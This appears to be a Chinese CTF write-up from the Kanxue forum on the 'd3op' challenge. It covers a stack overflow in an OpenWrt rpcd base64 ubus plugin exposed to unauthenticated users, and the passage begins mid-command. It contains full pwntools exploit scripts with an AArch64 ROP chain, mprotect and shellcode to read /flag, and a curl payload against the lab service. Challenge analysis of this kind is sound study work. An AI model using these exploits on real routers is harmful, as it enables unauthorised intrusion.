ggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=="}]}' http://127.0.0.1:9999/ubus
* Trying 127.0.0.1:9999...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)
> POST /ubus HTTP/1.1
> Host: 127.0.0.1:9999
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 1721
> Content-Type: application/x-www-form-urlencoded
> Expect: 100-continue
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Connection: Keep-Alive
< Transfer-Encoding: chunked
< Keep-Alive: timeout=20
< Content-Type: application/json
<
* Connection #0 to host 127.0.0.1 left intact
{"jsonrpc":"2.0","id":null,"result":[0,{"output":"flag{This_is_test_flag}naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}

至此，d3op复盘结束。

看雪ID：z1r0

https://bbs.kanxue.com/user-home-907087.htm

*本文为看雪论坛优秀文章，由看雪论坛 z1r0 原创，转载请注明来自看雪社区

# 往期推荐

1、在 Windows下搭建LLVM 使用环境

2、深入学习smali语法

3、安卓加固脱壳分享

4、Flutter 逆向初探

5、一个简单实践理解栈空间转移

6、记一次某盾手游加固的脱壳与修复

球分享

球点赞

球在看


```
d3op
It might take a long time to start up, please connect about 2 minutes after the gambox start.

HINTS:
May be you need to do a diff with the rootfs in attachment.
```



```
一
初步分析
```



```
_______ ________ __
 | |.-----.-----.-----.| | | |.----.| |_
 | - || _ | -__| || | | || _|| _|
 |_______|| __|_____|__|__||________||__| |____|
 |__| W I R E L E S S F R E E D O M
 -----------------------------------------------------
 OpenWrt 22.03.3, r20028-43d71ad93e
 -----------------------------------------------------
```



```
diff: openwrt/squashfs-root/etc/TZ: No such file or directory
Only in d3op/squashfs-root/etc/config: network
diff: openwrt/squashfs-root/etc/localtime: No such file or directory
diff: openwrt/squashfs-root/etc/mtab: No such file or directory
diff: openwrt/squashfs-root/etc/ppp/resolv.conf: No such file or directory
diff: openwrt/squashfs-root/etc/resolv.conf: No such file or directory
diff --color -aur openwrt/squashfs-root/etc/shadow d3op/squashfs-root/etc/shadow
--- openwrt/squashfs-root/etc/shadow 2023-01-03 08:24:21
+++ d3op/squashfs-root/etc/shadow 2023-04-12 17:33:08
@@ -1,4 +1,4 @@
-root:::0:99999:7:::
+root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:19442::::::
 daemon:*:0:0:99999:7:::
 ftp:*:0:0:99999:7:::
 network:*:0:0:99999:7:::
diff: openwrt/squashfs-root/etc/ssl/cert.pem: No such file or directory
Only in d3op/squashfs-root: flag
diff: openwrt/squashfs-root/sbin/insmod: No such file or directory
diff: openwrt/squashfs-root/sbin/lsmod: No such file or directory
diff: openwrt/squashfs-root/sbin/modinfo: No such file or directory
diff: openwrt/squashfs-root/sbin/modprobe: No such file or directory
diff: openwrt/squashfs-root/sbin/rmmod: No such file or directory
diff: openwrt/squashfs-root/usr/bin/scp: No such file or directory
diff: openwrt/squashfs-root/usr/bin/ssh: No such file or directory
diff: openwrt/squashfs-root/usr/bin/wget: No such file or directory
Only in d3op/squashfs-root/usr/libexec/rpcd: base64
diff --color -aur openwrt/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json d3op/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json
--- openwrt/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json 2023-01-03 08:24:21
+++ d3op/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json 2023-04-10 02:25:53
@@ -1,13 +1,17 @@
 {
- "unauthenticated": {
- "description": "Access controls for unauthenticated requests",
- "read": {
- "ubus": {
- "session": [
- "access",
- "login"
- ]
- }
- }
- }
+ "unauthenticated": {
+ "description": "Access controls for unauthenticated requests",
+ "read": {
+ "ubus": {
+ "session": [
+ "access",
+ "login"
+ ],
+ "base64": [
+ "decode",
+ "encode"
+ ]
+ }
+ }
+ }
 }
```



```
Only in d3op/squashfs-root/usr/libexec/rpcd: base64

+ "unauthenticated": {
+ "description": "Access controls for unauthenticated requests",
+ "read": {
+ "ubus": {
+ "session": [
+ "access",
+ "login"
+ ],
+ "base64": [
+ "decode",
+ "encode"
+ ]
+ }
+ }
+ }
```



```
- list [<path>] List objects
 - call <path> <method> [<message>] Call an object method
 - listen [<path>...] Listen for events
 - send <type> [<message>] Send an event
 - wait_for <object> [<object>...] Wait for multiple objects to appear on ubus
```



```
root@(none):/# ubus list
base64
container
dhcp
file
hotplug.dhcp
hotplug.iface
hotplug.neigh
hotplug.net
hotplug.ntp
hotplug.tftp
iwinfo
luci
luci-rpc
network
network.device
network.interface
network.interface.lan
network.interface.loopback
network.rrdns
network.wireless
rc
service
session
system
uci
```



```
root@(none):/# ubus -v list base64
'base64' @1e449b72
 "encode":{"input":"String"}
 "decode":{"input":"String"}
```



```
root@(none):/# ubus call base64 encode '{"input" : "z1r0"}'
{
 "output": "ejFyMAA="
}
```



```
二
漏洞分析
```



```
int __cdecl main(int argc, const char **argv, const char **envp)
{
 char v6[4096]; // [xsp+28h] [xbp-1028h] BYREF
 unsigned __int64 *specific_method; // [xsp+1028h] [xbp-28h]
 __int64 v8; // [xsp+1030h] [xbp-20h]
 __int64 *v9; // [xsp+1038h] [xbp-18h]
 int v10; // [xsp+1044h] [xbp-Ch]
 unsigned __int64 *method; // [xsp+1048h] [xbp-8h]

 init_base64(); // base64表
 if ( argc <= 1 )
 return 0;
 method = argv[1];
 if ( check_method(method, "list") )
 {
 v10 = read_input(0, v6, 0xFFFuLL);
 v6[v10] = 0;
 v9 = sub_402478(v6);
 if ( v9 )
 {
 v8 = sub_403C90(v9, "input");
 if ( v8 && sub_4059D0(v8) )
 {
 specific_method = argv[2];
 if ( !check_method(method, "call") )
 {
 ckec(specific_method, *(v8 + 32), byte_4A2098);
 sub_40B230("{"output": "%s"}n", byte_4A2098);
 sub_400A10(v9);
 }
 return 0;
 }
 else
 {
 return 0;
 }
 }
 else
 {
 return 0;
 }
 }
 else
 {
 uloop_init();
 return 0;
 }
}
```



```
unsigned __int64 __fastcall sub_422E60(int a1, void *a2, size_t a3)
{
 unsigned __int64 v4; // x19
 unsigned int v8; // w3
 unsigned __int64 v9; // x19
 int v10; // w2
 int v11; // w2

 if ( byte_4A0F78 )
 {
 v4 = linux_eabi_syscall(__NR_read, a1, a2, a3);
 if ( v4 > 0xFFFFFFFFFFFFF000LL )
 {
 v10 = -v4;
 v4 = -1LL;
 *(&dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2))) = v10;
 }
 return v4;
 }
 else
 {
 v8 = sub_444C30();
 v9 = linux_eabi_syscall(__NR_read, a1, a2, a3);
 if ( v9 > 0xFFFFFFFFFFFFF000LL )
 {
 v11 = -v9;
 v9 = -1LL;
 *(&dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2))) = v11;
 }
 sub_444CC0(v8);
 return v9;
 }
}
```



```
ckec(specific_method, *(v8 + 32), byte_4A2098);
sub_40B230("{"output": "%s"}n", byte_4A2098);
sub_400A10(v9);
```



```
__int64 __fastcall sub_4064F0(unsigned __int64 *a1, __int64 a2, __int64 a3)
{
 if ( check_method(a1, "encode") )
 {
 if ( !check_method(a1, "decode") )
 decode(a2, a3);
 }
 else
 {
 encode(a2, a3);
 }
 return 0LL;
}
```



```
➜ squashfs-root ./base64 call encode
{"input" : "z1r0"}
{"output": "ejFyMAA="}
```



```
__int64 __fastcall decode(char *json_input, __int64 out_put)
{
 int v3; // w0
 int v4; // w0
 int v5; // w0
 int v6; // w0
 int v7; // w0
 int v8; // w0
 int v9; // w0
 int v10; // w0
 int v11; // w0
 int v12; // w0
 int v13; // w0
 char v16[1028]; // [xsp+28h] [xbp+28h]
 int v17; // [xsp+42Ch] [xbp+42Ch]
 int v18; // [xsp+430h] [xbp+430h]
 int v19; // [xsp+434h] [xbp+434h]
 int v20; // [xsp+438h] [xbp+438h]
 int v21; // [xsp+43Ch] [xbp+43Ch]
 unsigned int size; // [xsp+440h] [xbp+440h]
 unsigned int v23; // [xsp+444h] [xbp+444h]
 unsigned int v24; // [xsp+448h] [xbp+448h]
 unsigned int len; // [xsp+44Ch] [xbp+44Ch]

 size = sub_400300();
 if ( (size & 3) != 0 )
 return 0LL;
 len = 3 * (size >> 2);
 if ( json_input[size - 1] == '=' )
 --len;
 if ( json_input[size - 2] == 61 )
 --len;
 if ( out_put )
 {
 v24 = 0;
 v23 = 0;
 while ( size > v24 )
 {
 if ( json_input[v24] == 61 )
 {
 ++v24;
 v3 = 0;
 }
 else
 {
 v4 = v24++;
 v3 = byte_4A1F98[json_input[v4]];
 }
 v21 = v3;
 if ( json_input[v24] == 61 )
 {
 ++v24;
 v5 = 0;
 }
 else
 {
 v6 = v24++;
 v5 = byte_4A1F98[json_input[v6]];
 }
 v20 = v5;
 if ( json_input[v24] == 61 )
 {
 ++v24;
 v7 = 0;
 }
 else
 {
 v8 = v24++;
 v7 = byte_4A1F98[json_input[v8]];
 }
 v19 = v7;
 if ( json_input[v24] == 61 )
 {
 ++v24;
 v9 = 0;
 }
 else
 {
 v10 = v24++;
 v9 = byte_4A1F98[json_input[v10]];
 }
 v18 = v9;
 v17 = v9 + (v21 << 18) + (v20 << 12) + (v19 << 6);
 if ( len > v23 )
 {
 v11 = v23++;
 v16[v11] = BYTE2(v17);
 }
 if ( len > v23 )
 {
 v12 = v23++;
 v16[v12] = BYTE1(v17);
 }
 if ( len > v23 )
 {
 v13 = v23++;
 v16[v13] = v17;
 }
 }
 sub_4002B0();
 }
 return 0LL;
}
```



```
三
漏洞利用
```



```
Arch: aarch64-64-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
```



```
from pwn import *
from os import system
import base64

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

file_name = './base64'

r = process([file_name, 'call', 'decode'])

def dbgg():
 raw_input()

elf = ELF(file_name)

dbgg()

p1 = b'aaaa'
p1 = p1.ljust(0x458, b"a")

p1 = base64.b64encode(p1)
ret = 0x406550

li(p1)

p2 = b'{"input":"' + p1 + b'"}'
li(p2)

r.sendline(p2)

r.interactive()
```



```
► 0x406280 ldrb w0, [x0]
 0x406284 cmp w0, #0x3d
 0x406288 b.ne #0x4062a0 <0x4062a0>
```



```
.text:0000000000406274 E0 4B 84 B9 LDRSW X0, [SP,#0x450+var8]
.text:0000000000406278 E1 0F 40 F9 LDR X1, [SP,#0x450+var_438]
.text:000000000040627C 20 00 00 8B ADD X0, X1, X0
.text:0000000000406280 00 00 40 39 LDRB W0, [X0]
.text:0000000000406284 1F F4 00 71 CMP W0, #0x3D ; '='
```



```
from pwn import *
from os import system
import base64

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

file_name = './base64'

r = process([file_name, 'call', 'decode'])

def dbgg():
 raw_input()

elf = ELF(file_name)

dbgg()

p1 = b''
p1 = p1.ljust(0x418, b'a')
p1 += b'x77x77x00x00'
p1 += b'x1dx04x00x00' #0x418 + 0x4 + 1
p1 += b'x84x05x00x00' #
p1 += b'x77x07x00x00'
p1 += p64(0)
p1 += b'b' * 8

p1 = base64.b64encode(p1)
ret = 0x406550

li(p1)

p2 = b'{"input":"' + p1 + b'"}'
li(p2)

r.sendline(p2)

r.interactive()
```



```
unsigned __int64 __fastcall sub_423340(void *a1, size_t a2, int a3)
{
 unsigned __int64 result; // x0
 int v4; // w1

 result = linux_eabi_syscall(__NR_mprotect, a1, a2, a3);
 if ( result >= 0xFFFFFFFFFFFFF001LL )
 {
 v4 = result;
 result = -1LL;
 *(&dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2))) = -v4;
 }
 return result;
}
```



```
.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
.text:00000000004578B8 A2 2E FF 97 BL sub_423340
```



```
.text:00000000004579A4 E2 00 80 52 MOV W2, #7
.text:00000000004579A8 FD 03 00 91 MOV X29, SP
.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
.text:00000000004579C0 60 2E FF 97 BL sub_423340
```



```
from pwn import *
from os import system
import base64

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

context(arch='aarch64', os='linux', log_level='debug')

file_name = './base64'

r = process([file_name, 'call', 'decode'])

def dbgg():
 raw_input()

elf = ELF(file_name)

dbgg()

shellcode = shellcraft.aarch64.linux.open("/flag", 0)
shellcode += shellcraft.aarch64.linux.read(3, 0x4a2098, 0x100)
shellcode += shellcraft.aarch64.linux.write(1, 0x4a2098, 0x100)
p1 = asm(shellcode)
p1 = p1.ljust(0x200, b'a')
p1 += p64(0) + p64(0x4A3000) + p64(0x4A0000)
p1 = p1.ljust(0x418, b'a')
p1 += b'x77x77x00x00'
p1 += b'x1dx04x00x00' #0x418 + 0x4 + 1
p1 += b'x84x05x00x00' #
p1 += b'x77x07x00x00'
p1 += p64(0)

# 0x000000000040064c : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
gadget1 = 0x000000000040064c

# 0x0000000000417920 : ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget2 = 0x0000000000417920

# 0x000000000040a95c : ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
gadget3 = 0x000000000040a95c

# 0x00000000004598c0 : ldp x19, x20, [sp, #0x10] ; mov x0, x3 ; ldp x29, x30, [sp], #0x50 ; ret
gadget4 = 0x00000000004598c0

# 0x0000000000444e14 : svc #0 ; ldp x21, x22, [sp, #0x20] ; mov w0, w19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x40 ; ret
gadget6 = 0x0000000000444e14
# 0x435338
gadget5 = 0x435338
'''
mov x1, x23
mov x0, x19
mov x2, x21
blr x20
'''

'''
.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
.text:00000000004578B8 A2 2E FF 97 BL sub_423340
'''

'''
.text:00000000004579A4 E2 00 80 52 MOV W2, #7
.text:00000000004579A8 FD 03 00 91 MOV X29, SP
.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
.text:00000000004579C0 60 2E FF 97 BL sub_423340
'''
magic_gadget = 0x00000000004579A4

# 0x0000000000400898 : ldr x0, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget7 = 0x0000000000400898

mprotect_addr = 0x423340
base64_decode_addr = 0x4a2098
#p1 += p64(0x00000000004579A4)
#p1 += p64(0x0000000000403ad8)
'''
p1 += p64(gadget4)
p1 += b'x00' * 0x20
p1 += p64(0) + p64(gadget1)
p1 += p64(0) + p64(mprotect_addr)
p1 += b'x00' * 0x30
p1 += p64(0) + p64(gadget2)
p1 += p64(0x4a2000) # x19
p1 += p64(0) * 2 + p64(gadget3)
p1 += p64(0) * 2 + p64(7) # x21
p1 += p64(0)
p1 += p64(0) + p64(base64_decode_addr)
p1 += p64(0) * 4 + p64(0x7000)
'''
p1 += p64(gadget7)
p1 += b'x00' * 0x20
p1 += p64(0) + p64(magic_gadget)
p1 += p64(0) * 2 + p64(base64_decode_addr + 0x200 - 0x490)
p1 += p64(base64_decode_addr) * 5

p1 = base64.b64encode(p1)
ret = 0x406550

li(p1)

p2 = b'{"input":"' + p1 + b'"}'
li(p2)

r.sendline(p2)

r.interactive()
```



```
* Trying 127.0.0.1:9999...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)
> POST /ubus HTTP/1.1
> Host: 127.0.0.1:9999
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 1721
> Content-Type: application/x-www-form-urlencoded
> Expect: 100-continue
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Connection: Keep-Alive
< Transfer-Encoding: chunked
< Keep-Alive: timeout=20
< Content-Type: application/json
<
* Connection #0 to host 127.0.0.1 left intact
{"jsonrpc":"2.0","id":null,"result":[2]}
```



```
from pwn import *
from os import system
import base64

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

context(arch='aarch64', os='linux', log_level='debug')

file_name = './base64'

r = process([file_name, 'call', 'decode'])

def dbgg():
 raw_input()

elf = ELF(file_name)

dbgg()

shellcode = shellcraft.aarch64.linux.open("/flag", 0)
shellcode += shellcraft.aarch64.linux.read(3, 0x4a23a4, 0x100)
shellcode += shellcraft.aarch64.linux.write(1, 0x4a2398, 0x100)
p1 = asm(shellcode)
p1 = p1.ljust(0x200, b'a')
p1 += p64(0) + p64(0x4A3000) + p64(0x4A0000)
p1 = p1.ljust(0x300, b'a')
p1 += b'{"output": "'
p1 = p1.ljust(0x350, b'a')
p1 += b'"}'
p1 = p1.ljust(0x418, b'a')
p1 += b'x77x77x00x00'
p1 += b'x1dx04x00x00' #0x418 + 0x4 + 1
p1 += b'x84x05x00x00' #
p1 += b'x77x07x00x00'
p1 += p64(0)

# 0x000000000040064c : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
gadget1 = 0x000000000040064c

# 0x0000000000417920 : ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget2 = 0x0000000000417920

# 0x000000000040a95c : ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
gadget3 = 0x000000000040a95c

# 0x00000000004598c0 : ldp x19, x20, [sp, #0x10] ; mov x0, x3 ; ldp x29, x30, [sp], #0x50 ; ret
gadget4 = 0x00000000004598c0

# 0x0000000000444e14 : svc #0 ; ldp x21, x22, [sp, #0x20] ; mov w0, w19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x40 ; ret
gadget6 = 0x0000000000444e14
# 0x435338
gadget5 = 0x435338
'''
mov x1, x23
mov x0, x19
mov x2, x21
blr x20
'''

'''
.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
.text:00000000004578B8 A2 2E FF 97 BL sub_423340
'''

'''
.text:00000000004579A4 E2 00 80 52 MOV W2, #7
.text:00000000004579A8 FD 03 00 91 MOV X29, SP
.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
.text:00000000004579C0 60 2E FF 97 BL sub_423340
'''
magic_gadget = 0x00000000004579A4

# 0x0000000000400898 : ldr x0, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget7 = 0x0000000000400898

mprotect_addr = 0x423340
base64_decode_addr = 0x4a2098
#p1 += p64(0x00000000004579A4)
#p1 += p64(0x0000000000403ad8)
'''
p1 += p64(gadget4)
p1 += b'x00' * 0x20
p1 += p64(0) + p64(gadget1)
p1 += p64(0) + p64(mprotect_addr)
p1 += b'x00' * 0x30
p1 += p64(0) + p64(gadget2)
p1 += p64(0x4a2000) # x19
p1 += p64(0) * 2 + p64(gadget3)
p1 += p64(0) * 2 + p64(7) # x21
p1 += p64(0)
p1 += p64(0) + p64(base64_decode_addr)
p1 += p64(0) * 4 + p64(0x7000)
'''
p1 += p64(gadget7)
p1 += b'x00' * 0x20
p1 += p64(0) + p64(magic_gadget)
p1 += p64(0) * 2 + p64(base64_decode_addr + 0x200 - 0x490)
p1 += p64(base64_decode_addr) * 5

p1 = base64.b64encode(p1)
ret = 0x406550

li(p1)

p2 = b'{"input":"' + p1 + b'"}'
li(p2)

r.sendline(p2)

r.interactive()
```



```
from pwn import *
from os import system

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

ip = 'http://127.0.0.1:9999/ubus'

p1 = '7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=='

shell = '''curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "''' + p1 + '''"}]}' ''' + ip

li(shell)

system(shell)
```



```
curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=="}]}' http://127.0.0.1:9999/ubus
* Trying 127.0.0.1:9999...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)
> POST /ubus HTTP/1.1
> Host: 127.0.0.1:9999
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 1721
> Content-Type: application/x-www-form-urlencoded
> Expect: 100-continue
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Connection: Keep-Alive
< Transfer-Encoding: chunked
< Keep-Alive: timeout=20
< Content-Type: application/json
<
* Connection #0 to host 127.0.0.1 left intact
{"jsonrpc":"2.0","id":null,"result":[0,{"output":"flag{This_is_test_flag}naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/5-1684500140.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/0-1684500141.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/0-1684500142.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/7-1684500142.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/1-1684500142.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/7-1684500142.gif)